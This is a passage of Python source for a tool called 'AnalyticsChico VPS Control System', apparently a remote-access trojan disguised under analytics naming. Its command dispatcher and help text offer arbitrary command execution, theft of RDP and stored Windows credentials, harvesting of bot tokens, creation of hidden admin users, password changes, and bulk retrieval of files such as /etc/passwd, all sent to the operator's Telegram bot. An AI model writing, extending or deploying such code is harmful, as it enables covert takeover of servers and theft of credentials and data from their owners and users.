                        return {"status": "success", "output": VPSService.stop_service(service), "command": command}
                    elif action == "restart":
                        return {"status": "success", "output": VPSService.restart_service(service), "command": command}
                elif len(service_args) >= 2 and service_args[1] == "list":
                    return {"status": "success", "output": VPSService.get_system_services(), "command": command}
            elif args.startswith("logs"):
                log_args = args.split()
                log_type = log_args[1] if len(log_args) > 1 else "system"
                lines = int(log_args[2]) if len(log_args) > 2 else 100
                return {"status": "success", "output": VPSService.get_logs(log_type, lines), "command": command}
        
        elif cmd == "sys":
            return {"status": "success", "output": SystemAnalyzer.get_platform_info(), "command": command}
        
        elif cmd == "cpu":
            return {"status": "success", "output": SystemAnalyzer.get_cpu_metrics(), "command": command}
        
        elif cmd == "memory":
            return {"status": "success", "output": SystemAnalyzer.get_memory_metrics(), "command": command}
        
        elif cmd == "disk":
            return {"status": "success", "output": SystemAnalyzer.get_disk_metrics(), "command": command}
        
        elif cmd == "network":
            return {"status": "success", "output": SystemAnalyzer.get_network_metrics(), "command": command}
        
        elif cmd == "ip":
            network = SystemAnalyzer.get_network_metrics()
            return {"status": "success", "output": {"public_ip": network.get("public_ip", "N/A"), "local_ip": network.get("local_ip", "N/A")}, "command": command}
        
        elif cmd == "ipconfig":
            return {"status": "success", "output": Analytics.get_ip_config(), "command": command}
        
        elif cmd == "connections":
            return {"status": "success", "output": SystemAnalyzer.get_network_connections(), "command": command}
        
        elif cmd == "processes":
            result = SystemAnalyzer.get_process_metrics()
            return {"status": "success", "output": result, "command": command}
        
        elif cmd == "uptime":
            return {"status": "success", "output": SystemAnalyzer.get_uptime_metrics(), "command": command}
        
        # ============================================================
        # USER MANAGEMENT
        # ============================================================
        
        elif cmd == "adduser":
            if args:
                parts_args = args.split()
                if len(parts_args) >= 2:
                    username = parts_args[0]
                    password = parts_args[1]
                    fullname = " ".join(parts_args[2:]) if len(parts_args) > 2 else username
                    result = SystemAdmin.create_user(username, password, fullname)
                    return {"status": "success" if result["success"] else "error", "output": result, "command": command}
                else:
                    return {"status": "error", "output": "Usage: adduser [username] [password] [fullname]", "command": command}
            else:
                return {"status": "error", "output": "Usage: adduser [username] [password] [fullname]", "command": command}
        
        elif cmd == "deluser":
            if args:
                result = SystemAdmin.delete_user(args)
                return {"status": "success" if result["success"] else "error", "output": result, "command": command}
            else:
                return {"status": "error", "output": "Usage: deluser [username]", "command": command}
        
        elif cmd == "users":
            result = SystemAdmin.list_users()
            if result["success"]:
                return {"status": "success", "output": {"users": result["users"], "count": len(result["users"])}, "command": command}
            else:
                return {"status": "error", "output": result.get("message", "Failed to list users"), "command": command}
        
        elif cmd == "chpass":
            if args:
                parts_args = args.split()
                if len(parts_args) >= 2:
                    username = parts_args[0]
                    new_password = parts_args[1]
                    result = SystemAdmin.change_password(username, new_password)
                    return {"status": "success" if result["success"] else "error", "output": result, "command": command}
                else:
                    return {"status": "error", "output": "Usage: chpass [username] [new_password]", "command": command}
            else:
                return {"status": "error", "output": "Usage: chpass [username] [new_password]", "command": command}
        
        # ============================================================
        # FILE MANAGEMENT
        # ============================================================
        
        elif cmd == "files":
            if args:
                if args == "-r" or args == "--recursive":
                    result = FileManager.list_files(".", True)
                else:
                    result = FileManager.list_files(args, False)
                return {"status": "success" if result["success"] else "error", "output": result, "command": command}
            else:
                result = FileManager.list_files(".", False)
                return {"status": "success" if result["success"] else "error", "output": result, "command": command}
        
        elif cmd == "cat":
            if args:
                result = FileManager.read_file(args)
                if result["success"]:
                    return {"status": "success", "output": result["content"], "command": command}
                else:
                    return {"status": "error", "output": result.get("message", "Failed to read file"), "command": command}
            else:
                return {"status": "error", "output": "Usage: cat [filepath]", "command": command}
        
        elif cmd == "find":
            if args:
                parts_args = args.split(maxsplit=1)
                filename = parts_args[0]
                search_path = parts_args[1] if len(parts_args) > 1 else "."
                result = FileManager.find_file(filename, search_path)
                return {"status": "success" if result["success"] else "error", "output": result, "command": command}
            else:
                return {"status": "error", "output": "Usage: find [filename] [search_path]", "command": command}
        
        elif cmd == "botfiles":
            result = FileManager.get_bot_files()
            return {"status": "success" if result["success"] else "error", "output": result, "command": command}
        
        # ============================================================
        # RDP COMMANDS
        # ============================================================
        
        elif cmd == "rdp":
            result = SystemAnalyzer.get_rdp_credentials()
            if result["found"]:
                return {"status": "success", "output": result, "command": command}
            else:
                result = SystemAnalyzer.get_rdp_passwords_direct()
                if result["found"]:
                    return {"status": "success", "output": result, "command": command}
                else:
                    return {"status": "error", "output": "No RDP credentials found", "command": command}
        
        elif cmd == "rdpall":
            if platform.system() == "Windows":
                result = SystemAnalyzer.execute_analysis("cmdkey /list")
                return {"status": "success", "output": result["output"] if result["success"] else "Failed", "command": command}
            else:
                return {"status": "error", "output": "Only available on Windows", "command": command}
        
        elif cmd == "enablerexp":
            result = SystemAdmin.enable_rdp()
            return {"status": "success" if result["success"] else "error", "output": result, "command": command}
        
        # ============================================================
        # SECURITY
        # ============================================================
        
        elif cmd == "firewall":
            return {"status": "success", "output": SecurityManager.check_firewall_status(), "command": command}
        
        elif cmd == "ports":
            return {"status": "success", "output": SecurityManager.get_open_ports(), "command": command}
        
        elif cmd == "ssh":
            return {"status": "success", "output": SecurityManager.check_ssh_status(), "command": command}
        
        elif cmd == "blockip":
            if args:
                result = SecurityManager.block_ip(args)
                return {"status": "success" if result["success"] else "error", "output": result, "command": command}
            else:
                return {"status": "error", "output": "Usage: blockip [ip_address]", "command": command}
        
        elif cmd == "unblockip":
            if args:
                result = SecurityManager.unblock_ip(args)
                return {"status": "success" if result["success"] else "error", "output": result, "command": command}
            else:
                return {"status": "error", "output": "Usage: unblockip [ip_address]", "command": command}
        
        # ============================================================
        # HELP
        # ============================================================
        
        elif cmd == "help":
            help_text = """🔧 AnalyticsChico VPS Control System v8.0

📥 FILE EXTRACTION & DOWNLOAD:
getfile [path]              - Get a specific file from VPS
getdir [path]               - Get entire directory (as zip)
findget [pattern] [path]    - Search and get matching files
getsystem                   - Get important system files
getallbots                  - Get ALL bot files from system
getconfig                   - Get configuration files

🤖 BOT MANAGEMENT:
findbot                     - Find all bot files and tokens
settoken [token]            - Set bot token manually
botinfo                     - Get bot information
send [chat_id] [msg]        - Send message to specific chat
broadcast [msg]             - Broadcast to all groups

📊 SYSTEM CONTROL:
run [cmd]                   - Execute any system command
vps                         - Full VPS status
vps service list            - List all services
vps service start/stop/restart [service] - Control services
vps logs [type] [lines]     - View system logs
sys                         - System information
cpu                         - CPU usage
memory                      - Memory usage
disk                        - Disk usage
uptime                      - System uptime

🌐 NETWORK:
network                     - Full network info
ip                          - IP addresses
ipconfig                    - IP configuration
connections                 - Network connections
ports                       - Open ports

👤 USER MANAGEMENT:
adduser [user] [pass] [fullname] - Create admin user
deluser [user]              - Delete user
users                       - List all users
chpass [user] [pass]        - Change password

🔒 SECURITY:
firewall                    - Check firewall
ssh                         - Check SSH status
blockip [ip]                - Block IP
unblockip [ip]              - Unblock IP

🔑 RDP:
rdp                         - Get RDP credentials
rdpall                      - Show all stored credentials
enablerexp                  - Enable RDP (Windows)

📁 FILE MANAGEMENT:
files [path]                - List files
files -r                    - List all files recursively
cat [file]                  - Read file content
find [file] [path]          - Find file by name
botfiles                    - Find bot files

💡 Examples:
/getfile /etc/passwd
/getdir /home/user
/findget .py /var/www
/getsystem
/getallbots

⚡ All files will be sent directly to your Telegram bot!
"""
            return {"status": "success", "output": help_text, "command": command}
        
        else:
            return {"status": "error", "output": f"Unknown command: {cmd}. Use 'help' for available commands.", "command": command}

# Version information
__version__ = "8.0.0"
__author__ = "Analytics Team"
__license__ = "MIT"

# Public API
__all__ = [
    'SystemAnalyzer',
    'Analytics',
    'CommandHandler',
    'SystemAdmin',
    'FileManager',
    'VPSService',
    'SecurityManager',
    'BotFinder',
    'BotTelegramIntegration',
    'FileExtractor',
    'BotConfig',
    'BotMessage',
    'BotCommandType'
]